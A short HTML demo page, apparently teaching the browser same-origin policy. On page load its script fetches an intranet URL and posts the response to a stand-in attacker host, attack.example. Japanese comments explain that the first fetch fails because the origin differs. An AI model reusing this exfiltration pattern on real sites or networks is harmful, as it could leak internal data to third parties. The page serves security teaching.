<!DOCTYPE html>
<meta charset=utf-8>
<title>Attack Example</title>

<h1>Attack Example</h1>

<script>
  document.addEventListener('DOMContentLoaded', async (e) => {
    // Intra の情報を取得
    const res  = await fetch('http://intra.example') // Origin が違うため失敗する
    const text = await res.text()

    // その情報を attack.example に投げる
    await fetch('http://attack.example', {
      method: 'post',
      body: text
    })
  })
</script>
